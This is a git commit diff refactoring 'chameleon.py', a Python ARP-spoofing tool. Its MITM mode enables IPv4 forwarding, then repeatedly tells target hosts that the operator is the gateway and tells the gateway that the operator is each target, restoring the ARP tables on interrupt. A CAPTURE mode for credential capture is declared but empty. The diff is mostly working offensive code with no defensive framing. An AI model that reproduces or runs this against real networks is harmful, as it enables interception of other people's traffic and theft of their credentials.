f833420d1beefb37e88b4356d7c08f601acca5e9
Kyle Mistele <kyle@mistele.com>
2020-05-12 00:03:43 -0500

    refactoresd

--- chameleon.py
+++ chameleon.py
@@ -1,38 +1,40 @@
 # IMPORTS
 import argparse
 import subprocess
-import signal
+import os
 import sys
 import apt
-import os
-from scapy.all import srp, Ether, ARP
+
 from time import sleep
+
+# CUSTOM RESOURCES
+from library.validate_address import AddressValidator
+from library.custom_arp_lib import spoof, restore
 
 # CREATE PARSER
 parser = argparse.ArgumentParser()
 
 # ADD REQUIRED ARGUMENTS
-parser.add_argument("host", help="The IPv4 address you want to intercept traffic to/from")
-parser.add_argument("iface", help="The network interface to use")
+parser.add_argument("--mode", required=True, help="Specifies mode. Valid modes are MITM and CAPTURE. MITM is for man-in-the-middle attacks, and CAPTURE will spin up credential capture services on common ports")
 
-# ADD OPTIONAL ARGUMENTS
-parser.add_argument("--timeout", help="Specify an timeout in seconds between malicious ARP queries. Default: 60 ")
-parser.add_argument("--targets", help="Used  to specify a target file, or specify DISCOVER to discover and target all hosts on the subnet (DISCOVER mode not recommended)")
-parser.add_argument("--target", help="Used with SINGLE mode to specify the IP address of a single host to poison the cache of.")
+# ARGUMENTS FOR MITM
+isMitmMode = "--mode" in sys.argv and "MITM" in sys.argv
+parser.add_argument("--gateway", required=isMitmMode, help="For MITM mode. The IP address of the gateway or server that you wish to place yourself in the route to from the targets")
+parser.add_argument("--targeting", required=isMitmMode, help="For MITM mode. A single IP address, or a file containing newline-separated IP addresses against which to conduct a MITM attack")
 
-# PARSE ARGUMENTS
-args = parser.parse_args()
+# ARGUMENTS FOR CAPTURE
+isCaptureMode = "--mode" in sys.argv and "CAPTURE" in sys.argv
+parser.add_argument("--impersonate", required=isCaptureMode, help="For CAPTURE mode. The IP address to capture traffic to ")
+parser.add_argument("--deceive", required=isCaptureMode, help="For CAPTURE mode. The IP address or a file containing IP addresses to poison the ARP cache(s) of.")
 
-IP = args.ip_addr
-IFACE = args.iface
+parser.add_argument("--timeout", help="Timeout in seconds between ARP requests. Default is 45.")
 
-timeout = args.timeout
-if not timeout:
-    timeout = 30
-target = args.target
-targets = args.targets
+# VALIDATE ARGUMENTS
+if not (isCaptureMode or isMitmMode):
+    print(f'Specify a valid mode with the --mode flag! Use the -h option for help')
+    quit()
 
-# ENSURE THAT UTILITIES WE NEED ARE INSTALLED
+# CHECK DEPENDENCIES
 print("[+] Checking dependencies...")
 
 # IF DOTFILE HAS BEEN WRITTEN BY PREVIOUS CHECK
@@ -43,79 +45,106 @@ else:
     cache = apt.Cache()
     cache.open()
     if not cache["net-tools"].is_installed:
-        print("[!] Please install the 'net-tools' package with 'sudo apt install arping'!")
+        print("[!] Please install the 'net-tools' package with 'sudo apt install net-tools'!")
         print("[!] Quitting...")
         quit()
     with open(".dependencies_met", 'w') as f:
         f.write("do not remove me, this file confirms that dependencies have been met")
     print("[+] Dependencies met!")
 
-# CREATE A LISTENER FOR SIGTERM TO DO CLEANUP
-# DO CLEAN UP
-def sigterm_handler(_signo, _stack_frame):
-    print(f'\n\n')
-    print(f'[+] Cleaning up aliased interface...')
-    os.system(f'ifconfig {IFACE}:evil down')
-    print(f'[+] Interface cleanup completed')
-    quit()
-
-# SET LISTENERS
-signal.signal(signal.SIGTERM, sigterm_handler)
-signal.signal(signal.SIGINT, sigterm_handler)
-
-
-# DETERMINE TARGETS
-targetArr = []
-fname = None
-if not targets and not target:
-    print(f'[!] WARNING: you must specify target/s with the --target or --targets options')
-if target:
-    print(f'[+] Launching in SINGLE mode')
-    print(f'[+] Target:\t\t{target}')
-    targetArr.append(target)
+# PARSE ARGUMENTS
+args = parser.parse_args()
+mode = args.mode
+timeout = None
+if not args.timeout:
+    timeout = 45
 else:
-    print(f'[+] Launching in MULTI mode')
+    timeout = args.timeout
 
-    # IF USING TARGET DISCOVERY MODE
-    if targets == "DISCOVER":
-        print(f'[+] Discovering targets...')
-        
-        # TODO: use IP SWEEP PROGRAM TO GENERATE A LIST OF IP ADDRESSES
+if not mode:
+    print(f'[!] Error: specify a valid mode of either MITM or CAPTURE with the --mode flag')
 
-    # IF USING A TARGET FILE
+# ENABLE ROUTE FORWARDING
+print(f'[+] Checking to see if IPv4 forwarding is enabled')
+fp = "/proc/sys/net/ipv4/ip_forward"
+with open(fp, 'r') as f:
+    val = f.read().strip()
+    if val == '1':
+        print(f'[+] IPv4 forwarding is already enabled')
+        fwd_enabled = True
     else:
-        fname = targets
+        print(val)
+        print(f'[+] IPv4 forwarding is currently disabled. Enabling...')
+        fwd_enabled = False
+ 
+if not fwd_enabled:
+     with open(fp, 'w') as f:
+         print(1, file=f)
+         print(f'[+] IPv4 forwarding enabled successfully')
 
-        # TODO: OPEN A FILE!
-        if not os.path.exists(fname):
-            print(f'[!] WARNING: target file not found. ')
-            print(f'[!] Quitting...')
-            quit()
+
+############################################################
+# FOR MITM MODE
+############################################################
+if isMitmMode:
+    GATEWAY = args.gateway
+    TARGETS = []
+
+    # CHECK IF FILE EXISTS
+    if os.path.exists(args.targeting):
+        with open(args.targeting, 'r') as targetFile:
+            t = targetFile.readlines()
+            TARGETS = [target.strip() for target in t]
+    else:
+        TARGETS = [args.targeting]
+    
+    # VALIDATE TARGETS
+    validator = AddressValidator()
+    print(f'[+] Validating targets as IP Addresses:')
+    for target in TARGETS:
+        isValid = validator.check(target)
+        if isValid:
+            print(f'\t{target}')
         else:
-            print(f'[+] Opening targets file')
-            with open(fname, "r") as targetFile:
-                targetArr = targetFile.readlines()
-                targetArr = [t.strip() for t in targetArr]
-            print(f'[+] Identified targets:')
-            for t in targetArr:
-                print(f'\t[+] {t}')
+            print(f'\t{target} is not a valid IP Address!')
+            quit()
+    
+    print(f'[+] Validating gateway as IP Address:')
+
+    if validator.check(GATEWAY):
+        print(f'\t{GATEWAY}')
+    else:
+        print(f'\t{GATEWAY} is not a valid IP Address!')
+        quit()
+
+    # DO THE SPOOFING
+    try:
+
+        while(True):
+            for target in TARGETS:
+
+                # CONVINCE EACH TARGET I AM THE GATEWAY
+                print(f'[+] Impersonating {GATEWAY} to {target}')
+                spoof(target, GATEWAY) 
+
+                # CONVINCE THE GATEWAY i AM EACH TARGET
+                print(f'[+] Impersonating {target} to {GATEWAY}')
+                spoof(GATEWAY, target) 
 
 
+            sleep(int(timeout))    # WAIT <timeout> SECONDS IN BETWEEN REQUESTS
 
-# ALIAS THE INTERFACE
-print(f'[+] Aliasing interface {IFACE} to {IFACE}:evil with Spoofed IP address {IP}')
-os.system(f'ifconfig {IFACE}:evil {IP} up')
 
-# SEND SPOOFS
-print(f'[+] Beginning Spoofing:\n')
-while (True):
-    for target in targetArr:
-        print(f'[+] Sending ARP request to {target}')
-        # CREATE AN ARP PACKET
-        # DST: DESTINATION = BROADCAST
-        # PDST: PACKET DESTINATION = TARGET
-        # PSRC: PACKET SOURCE = SPOOFED IP ADDRESS
-        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target, psrc=IP), timeout=3)
-        if ans:
-            print(f'[+] Received response from {target}\n')
-    sleep(timeout)
+    except KeyboardInterrupt:
+        print(f'\n[+] Detected Interrupt. Restoring the network, please wait!')
+        for target in TARGETS:
+            print(f'[+] Restoring proper \'route\' from {GATEWAY} to {target}')
+            restore(GATEWAY, target)
+            print(f'[+] Restoring proper \'route\' from {target} to {GATEWAY}')
+            restore(target, GATEWAY)
+        quit()
+############################################################
+# FOR CAPTURE MODE
+############################################################
+if isCaptureMode:
+    pass
